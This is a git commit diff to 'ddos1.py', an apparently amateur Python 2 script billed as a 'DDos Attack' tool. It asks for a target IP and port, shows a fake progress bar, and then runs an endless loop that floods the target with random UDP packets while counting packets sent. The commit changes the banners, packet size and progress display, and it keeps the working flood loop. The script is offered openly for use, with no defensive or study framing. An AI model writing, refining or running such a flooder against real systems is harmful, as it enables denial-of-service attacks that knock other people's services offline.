4a4964569d98b992139a375a63b390bad98f418f
zhicco234 <89173970+zhicco234@users.noreply.github.com>
2021-08-22 13:19:54 +0700

    Update ddos1.py

--- ddos1.py
+++ ddos1.py
@@ -3,7 +3,7 @@ import os
 import time
 import socket
 import random
-
+#Code Time
 from datetime import datetime
 now = datetime.now()
 hour = now.hour
@@ -13,16 +13,19 @@ month = now.month
 year = now.year
 
 ##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,socket.SOCK_STREAM)
-bytes = random._urandom(1409)
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
 #############
 
-
+os.system("clear")
+os.system("figlet DDos Attack")
+print
 os.system("clear")
 os.system("figlet DDos Attack")
 print
 print "Author   : zhicco234"
 print "github   : https://github.com/zhicco234"
+print
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
@@ -31,39 +34,14 @@ os.system("clear")
 os.system("figlet Attack Starting")
 print "[                    ] 0% "
 time.sleep(5)
-os.system("clear")
-print "[=               ] 1%"
-time.sleep(0)
-os.system("clear")
-print "[==               ] 2%"
-time.sleep(0)
-os.system("clear")
-print "[===               ] 3%"
-time.sleep(0)
-os.system("clear")
-print "[====              ] 4%"
-time.sleep(0)
-os.system("clear")
-print "[=====              ] 5%"
-time.sleep(10)
-os.system("clear")
-print "EROR SYSTEM"
-time.sleep(10)
-os.system("clear")
-print "[============       ] 25%"
-time.sleep(0)
-os.system("clear")
-print "[==============      ] 50%"
-time.sleep(0)
-os.system("clear")
-print "[==================  ] 70%" 
-time.sleep(0)
-os.system("clear")
-print "[====================] 100%"  
-time.sleep(10) 
-os.system("clear")
-print "SEBENTAR....."
+print "[=====               ] 25%"
 time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
@@ -72,4 +50,6 @@ while True:
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
+
+
 
